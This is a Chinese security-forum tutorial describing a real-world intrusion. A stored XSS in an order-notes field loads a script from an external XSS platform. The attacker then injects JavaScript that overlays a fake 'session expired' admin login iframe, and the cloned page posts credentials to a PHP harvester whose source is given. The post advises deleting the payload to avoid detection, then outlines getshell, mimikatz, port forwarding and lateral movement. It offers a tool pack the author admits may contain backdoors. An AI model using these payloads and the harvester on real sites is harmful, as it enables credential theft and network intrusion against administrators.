i春秋作家：jasonx

原文来自：[一个xss漏洞到内网漫游【送多年心血打造的大礼包啦！】](https://bbs.ichunqiu.com/thread-46068-1-1.html?from=beef)​​​​​​​

#### 前言

渗透过程中，有时候遇某些网站，明明检测到有xss漏洞，但是盲打以后，收到的cookie还是不能登录后台，大多数的原因都是因为对方的cookie关键参数开启了httponly，导致你获取到的cookie参数不全，所以没法登录。

今天和大家分享一次绕过httponly拿后台的思路。

### 0x01 遇到一个存在xss的站点

这个站点在提交订单的时候，下面有个订单备注输入框存在存储型xss。  
我们直接插入插入xss代码；

`</textarea>'"><script src=https://xx.cc/x/7Zbi58></script>`

  
![image.png](https://image.3001.net/images/20180928/1538121098_5baddd8a750da.png!small)  

过了没多久拿到了cookie

![image.png](https://image.3001.net/images/20180928/1538121110_5baddd96614cb.png!small)  

但是我们尝试用cookie登录的时候失败了。

![image.png](https://image.3001.net/images/20180928/1538121117_5baddd9d818d5.png!small)  

那么问题来了，如何才能拿到后台呢？

### 0x02 xss钓鱼拿下后台

因为xss平台已经收到后台的url地址了。  
那么我们直接访问这个后台地址，然后右键查看源代码。

![image.png](https://image.3001.net/images/20180928/1538121125_5baddda5794c5.png!small)  

然后把所有代码复制到我们新建的一个html文件里面。  
修改里面的代码,把所有相对路径的地方，全部改成绝对路径，(啥意思呢？请看下面分析。)

比如里面有的链接是这样的 /index.php  
我们要修改成被钓鱼的域名加上/index.php  
改完后应该是这样的 [http://被钓鱼的域名.com/index.php](http://xn--eqrt2goy0bcdqptnfgl.com/index.php)

![image.png](https://image.3001.net/images/20180928/1538121132_5badddacc34f6.png!small)  

注意：所有相对路径链接部分都要改。

然后我们把action=这里修改成我们的1.php文件地址（源码在下面）  
`<form action="http://www.我们的php域名.com/1.php" method="post" class="login-form">`

#### 1.php源码如下

    
    
    <?php 
    $str=''; 
    $str.='name:'.$_POST['name'].'|'; 
    $str.='pwd:'.$_POST['pwd'].'|'; 
    $str.='ip:'.$_SERVER["REMOTE_ADDR"].'|'; 
    $str.='time:'.date("m-d-h:i"); 
    file_put_contents('log.txt',$str.PHP_EOL, FILE_APPEND); 
    #下面这行的意思是记录完账号密码以后跳转到他原来的后台地址。
    header("location:https://www.baidu.com/admin.php");
    ?> 

注意：你的html文件里面的用户名和密码的参数名称要对应1.php的修改。  
name=的这里，要和1.php的对应，要不然接收不到账号密码。

![image.png](https://image.3001.net/images/20180928/1538121140_5badddb4a39e3.png!small)  

1.php的后面添加上被钓鱼方的后台首页地址，成功拿到密码以后会自动跳回他后台首页。

接下来我们把这个html文件和1.php放到网站空间，直接phpstudy搭建一个也可以的。

现在去xss平台新建一个项目  
名称什么的随便输入，在自定义代码处输入以下代码。  
把其中的url地址修改成你的html地址。

    
    
    setTimeout(function(){
    alert("登陆过期，请重新登陆！");
    parent.document.writeln("<iframe style=\"margin:0px;padding:0px;height:100%;width:100%;\" src=\"https:\/\/我的钓鱼域名.com/index.html\" frameBorder=0 scrolling=no></iframe>");
    setTimeout(function(){
    document.getElementsByTagName("body")[0].setAttribute("style","margin:2px;");},100);
    setTimeout(function(){
    parent.document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");},100);
    },1500);

我们把得到的xss地址复制下来，插入到订单备注里面。  
管理员看到我们的订单以后，1.5秒后就会自动弹出“登录过期，请重新登陆”的提示，并在url不改变的情况下，跳转到我们伪造的登录页面上去了。

接下来只要管理员输入了账号密码，并且提交，那么我们钓鱼服务器就收到账号密码啦，管理员那边也正常跳转到他的后台。

![image.png](https://image.3001.net/images/20180928/1538121149_5badddbd43803.png!small)  

注意：拿到账号密码以后请迅速删掉你的xss项目，要不然管理员那边每一次浏览你的订单都会跳出这个登录页面，避免被发现。  
另外实际操作的时候，你可以修改下代码，比如判断是否登录成功，或者修改延时等等，我这只是提供一个思路，抛砖引玉吧。

然后我们用拿到的账号密码登录后台，找上传点getshell。

拿到shell以后我们用 mimikatz（咪咪卡住）获取管理员密码。  
然后通过ipconfig看到对方服务器在内网，所以我们需要转发端口出来，这里方法很多了，lcx转发 ngrok等等都可以的。

转发出来我们用获取到的密码直接登录服务器。  
先收集一波内网信息。

    
    
    net view 列出工作组下的计算机名称。
    arp -a 查看arp缓存表。

  
![image.png](https://image.3001.net/images/20180928/1538121155_5badddc3c53b5.png!small)  

然后就是横向怼了。

附上钓鱼的演示源码  
链接: <https://pan.baidu.com/s/1VrvYXLy4ozXN-8iR7Uj7rA> 提取码: giu3

* * *

∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷ 华丽的分割线 ∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷∷

* * *

以上都不是重点，重点是我要放出自己用了多年的【[渗透工具](http://bbs.ichunqiu.com/portal.php)包】啦。  
里面的很多工具都是一点点收集来的，因为都是来源于互联网，部分工具可能存在后门，请大家下载以后自行查杀，部分批量的工具过于敏感就不放出来啦。

#### 声明：

工具是一把刀，既能切菜，也能伤人，我分享的初衷是便于大家做授权的[渗透测试](http://bbs.ichunqiu.com/portal.php)，所以请不要用于非法用途，否则一切后果自负。

![image.png](https://image.3001.net/images/20180928/1538121171_5badddd3be622.png!small)![image.png](https://image.3001.net/images/20180928/1538121190_5baddde6d4e83.png!small)![image.png](https://image.3001.net/images/20180928/1538121193_5baddde9b8b5f.png!small)  

#### 渗透工具包下载地址

下载地址和解压密码回复可见，工具包最好用7-zip解压，避免出现不必要的问题。

  

